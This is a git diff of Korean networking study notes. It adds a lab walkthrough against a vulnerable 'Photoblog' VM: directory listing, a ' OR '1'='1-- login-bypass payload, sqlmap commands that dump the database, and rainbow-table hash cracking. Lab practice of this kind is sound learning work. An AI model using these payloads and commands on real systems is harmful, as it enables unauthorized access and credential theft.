@@ -49,10 +49,10 @@ TCP/IP step, Gate way
 네트워크는 계층적으로 통신함(OSI 7 Layer, TCP/IP 4 Layer)  
 ![layer](https://user-images.githubusercontent.com/50771111/88609141-5cf2c880-d0be-11ea-8611-cdb2d97571a1.png)
 
-     **subnet mask**     
-        (1) 같은 네트워크 영역 => ARP 테이블의 MAC주소로 통신.  
-        (2) 다른 네트워크 영역 => 게이트웨이(IP)로 데이터를 보낸다.  
-            (게이트웨이의 IP 주소에 대한 MAC 주소로 데이터를 보낸다.)
+   **subnet mask**     
+    (1) 같은 네트워크 영역 => ARP 테이블의 MAC주소로 통신.  
+    (2) 다른 네트워크 영역 => 게이트웨이(IP)로 데이터를 보낸다.  
+        (게이트웨이의 IP 주소에 대한 MAC 주소로 데이터를 보낸다.)
    
  **====> DNS 쿼리가 이루어졌다.(172.217.161.174)**
 
@@ -100,4 +100,33 @@ ping: icmp프로토콜, 네트워크 상태를 모니터링 하고 확인하기 
 > kali -> application -> 파이어 폭스 -> 주소창에 10.0.2.4 입력  
 >   ==> My Awesome Photoblog 화면 출력!!  
 
+#### 디렉토리 리스팅
+> 위에서 사진에서 마우스 우클릭 -> copy Image Location -> 주소창에 입력 -> 뒤에 이미지명 지우기  
+>   => Index 파일 리스팅 됨
 
+### [SQL Injection]
+```
+ID와 PW를 입력하면
+id : ' OR '1' = '1--
+select count(*) from user_id whre id=’' OR '1' = '1’ -- and Pw=’hi’
+```
+- kali shell  
+> sqlmap -u "http://10.0.2.9/cat.php?id=1"  //sql injection에 취약한 URL 파라미터로 던져봄
+
+```
+sqlmap -u "http://10.0.2.9/cat.php?id=1"  
+
+sqlmap -u "http://10.0.2.9/cat.php?id=1" --current-db  
+    > photoblog 확인  
+    
+```
+
+포토DB의 테이블 떠보기
+> sqlmap -u "http://10.0.2.9/cat.php?id=1" -D photoblog --dump  
+>   조금 위로 올려보면 id/pw 나와있는거 볼 수 있음
+
+hash 함수: 고정된 길이. 다른 입력값 -> 다른 출력값, 출력값으로 입력값 예측 불가  
+근데 어떻게 풀었지!?!  
+   - 중국에서 해쉬값 풀어놓은 테이블 O -> 레인보우 테이블 
+   
+**id/pw로 로그인 가능한거 확인함!!**
